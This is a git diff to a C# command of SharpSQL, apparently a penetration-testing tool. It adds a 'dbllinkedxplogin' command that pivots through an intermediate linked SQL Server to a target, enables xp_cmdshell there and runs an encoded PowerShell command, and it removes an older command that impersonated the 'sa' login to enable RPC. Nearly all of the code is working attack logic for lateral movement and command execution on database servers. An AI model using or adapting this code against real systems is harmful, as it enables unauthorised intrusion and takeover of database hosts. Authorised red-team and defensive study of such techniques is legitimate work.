@@ -5,20 +5,21 @@ using System.Data.SqlClient;
 
 namespace SharpSQL.Commands
 {
-    public class linkedrpc : ICommand
+    public class dbllinkedxplogin : ICommand
     {
-        public static string CommandName => "linkedrpc";
+        public static string CommandName => "dbllinkedxplogin";
 
         public void Execute(Dictionary<string, string> arguments)
         {
-            Console.WriteLine("[*] Action: Reconfigure Linked SQL Server to Allow RPC connections:");
-            Console.WriteLine("\tSharpSQL.exe rpc /db:DATABASE /server:SERVER /target:TARGET [/sqlauth /user:SQLUSER /password:SQLPASSWORD]\r\n");
+            Console.WriteLine("[*] Action: Execute Encoded PowerShell 'whoami' Command on Double-Linked SQL Server via 'xp_cmdshell':");
+            Console.WriteLine("\tUsage: SharpSQL.exe dbllinkedxplogin /db:DATABASE /server:SERVER /intermediate:INTERMEDIATE /target:TARGET [/sqlauth /user:SQLUSER /password:SQLPASSWORD]\r\n");
 
             string user = "";
             string password = "";
             string connectInfo = "";
             string database = "";
             string connectserver = "";
+            string intermediate = "";
             string target = "";
 
             bool sqlauth = false;
@@ -35,6 +36,10 @@ namespace SharpSQL.Commands
             {
                 connectserver = arguments["/server"];
             }
+            if (arguments.ContainsKey("/intermediate"))
+            {
+                intermediate = arguments["/intermediate"];
+            }
             if (arguments.ContainsKey("/target"))
             {
                 target = arguments["/target"];
@@ -50,9 +55,13 @@ namespace SharpSQL.Commands
                 Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                 return;
             }
+            if (String.IsNullOrEmpty(intermediate))
+            {
+                Console.WriteLine("\r\n[X] You must supply an intermediate server!\r\n");
+            }
             if (String.IsNullOrEmpty(target))
             {
-                Console.WriteLine("\r\n[X] You must supply a target linked SQL server!\r\n");
+                Console.WriteLine("\r\n[X] You must supply a target server!\r\n");
                 return;
             }
 
@@ -96,18 +105,33 @@ namespace SharpSQL.Commands
                 Environment.Exit(0);
             }
 
-            string execAs = "EXECUTE AS LOGIN = 'sa';";
-            SqlCommand command = new SqlCommand(execAs, connection);
+            string enableAdvOptions = $"EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT {target}') AT {intermediate}";
+            SqlCommand command = new SqlCommand(enableAdvOptions, connection);
             SqlDataReader reader = command.ExecuteReader();
             reader.Read();
-            Console.WriteLine("\n[*] Attempting impersonation..");
+            Console.WriteLine("\n[*] Enabling Advanced options..");
             reader.Close();
 
-            string enableRPC = $"EXEC sp_serveroption '{target}', 'rpc', 'true'; EXEC sp_serveroption '{target}', 'rpc out', 'true';";
-            command = new SqlCommand(enableRPC, connection);
+            string enableXP = $"EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT {target}') AT {intermediate}";
+            command = new SqlCommand(enableXP, connection);
             reader = command.ExecuteReader();
             reader.Read();
-            Console.WriteLine($"[*] Successfully Reconfigured {target} to Allow RPC Connections!");
+            Console.WriteLine("[*] Enabling xp_cmdshell..");
+            reader.Close();
+
+            string execCmd = $"EXEC ('EXEC (''xp_cmdshell ''''powershell -enc dwBoAG8AYQBtAGkA'''';'') AT {target}') AT {intermediate}";
+            command = new SqlCommand(execCmd, connection);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("[*] Executing command..");
+            Console.WriteLine("[+] Logged in as: " + reader[0] + $" on {target}");
+            reader.Close();
+
+            string disableXP = $"EXEC ('EXEC (''sp_configure ''''show advanced options'''', 0; RECONFIGURE;'') AT {target}') AT {intermediate}";
+            command = new SqlCommand(disableXP, connection);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("[*] Disabling xp_cmdshell..");
             reader.Close();
 
             connection.Close();
